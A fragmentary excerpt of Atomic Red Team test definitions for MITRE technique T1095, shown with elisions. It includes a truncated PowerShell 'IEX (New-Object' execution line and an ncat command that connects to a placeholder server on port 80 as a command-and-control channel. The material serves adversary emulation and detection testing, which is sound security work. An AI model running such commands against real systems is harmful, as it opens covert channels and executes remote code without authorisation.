...
[{'command': 'IEX (New-Object '
 ...
 {'command': 'cmd /c #{ncat_exe} #{server_ip} 80\n',
  'name': None,
  'source': 'atomics/T1095/T1095.yaml'},
...
```json
[{'Atomic Red Team Test - Non-Application Layer Protocol': {'atomic_tests': [{'auto_generated_guid': '0268e63c-e244-42db-bef7-72a9e59fc1fc',
                                                                              'description': 'This '
                                                                                             'will '
                                                                                             'attempt '
                                                                                             'to  '
...
* [Standard Non-Application Layer Protocol Mitigation](../mitigations/Standard-Non-Application-Layer-Protocol-Mitigation.md)
